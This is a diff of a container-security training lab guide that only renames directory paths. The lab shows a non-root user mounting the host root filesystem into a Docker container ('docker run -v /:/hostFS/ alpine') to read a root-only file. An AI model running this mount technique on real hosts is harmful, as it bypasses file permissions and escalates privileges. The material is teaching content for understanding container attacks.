@@ -10,10 +10,10 @@
 
 ##### Step 2:
 
-*  **cd** into  `Labs/3.0.0-Container-Attacks/3.1.0`
+*  **cd** into  `/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host`
 
     ```commandline
-    cd Labs/3.0.0-Container-Attacks/3.1.0
+    cd /home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host
     ```
 
 ##### Step 3:
@@ -21,16 +21,16 @@
 * Run `sudo su` to become root user.
 
     ```commandline
-      root@we45:~/Labs/3.0.0-Container-Attacks/3.1.0# sudo su
-      root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
+      root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# sudo su
+      root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
     ```
 ##### Step 4:
 
 * Create a `secret.txt` file inside `/root/` directory.
 
     ```commandline
-    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0# touch /root/secret.txt
-    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
+    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# touch /root/secret.txt
+    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
     ```
 ##### Step 5:
 
@@ -41,8 +41,8 @@
     2. `esc+:+wq` to save and exit from the file.
 
     ```commandline
-    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0# vim /root/secret.txt
-    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
+    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# vim /root/secret.txt
+    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
     ```
     
         
@@ -51,8 +51,8 @@
 * Run `sudo su user` login as a normal user.
 
     ```commandline
-    root@we45:~/Labs/3.0.0-Container-Attacks/3.1.0# sudo su user
-    user@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0$
+    root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# sudo su user
+    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$
     ```
 
 ##### Step 7: 
@@ -60,7 +60,7 @@
 * Run `cat /root/secret.txt` read the content of secret.txt file.
 
     ```commandline
-    user@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0$ cat /root/secret.txt
+    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$ cat /root/secret.txt
     cat: /root/secret.txt: Permission denied
     ```
 
@@ -69,16 +69,16 @@
 * Run `exit` to exit as a normal user
 
     ```commandline
-    user@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0$ exit
+    user@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host$ exit
     exit
-    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0# 
+    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# 
     ```
 
 ##### Step 9: 
 * Run `docker run -ti --rm -v /:/hostFS/ alpine` as `docker-user`(non-root user)
 
     ```commandline
-    root@we45:~/Labs/3.0.0-Container-Attacks/3.1.0# docker run -ti -v /:/hostFS/ alpine
+    root@we45:~/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host# docker run -ti -v /:/hostFS/ alpine
     / #     
     ```
     
@@ -119,5 +119,5 @@ secret
 
     ```commandline
     /hostFS/root # exit
-    root@we45:/home/we45/Labs/3.0.0-Container-Attacks/3.1.0#
+    root@we45:/home/we45/container_training/Container/Container-Attacks/Authentication-Attacks-against-Host#
     ```
